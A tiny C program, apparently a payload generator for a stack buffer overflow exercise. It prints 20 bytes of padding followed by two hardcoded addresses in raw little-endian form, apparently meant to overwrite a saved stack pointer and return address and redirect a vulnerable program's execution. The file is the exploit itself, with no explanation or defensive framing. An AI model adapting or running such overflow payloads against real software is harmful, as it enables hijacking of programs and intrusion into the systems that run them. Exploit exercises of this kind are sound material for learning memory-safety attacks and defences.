#include <stdio.h>
int main()
{
    unsigned int buffer=0xbffff6b8;
    unsigned int nonprintable=0x0804851a;
    printf("0123456789ab01234567%s%s\n", (char*)&buffer, (char*)&nonprintable);
}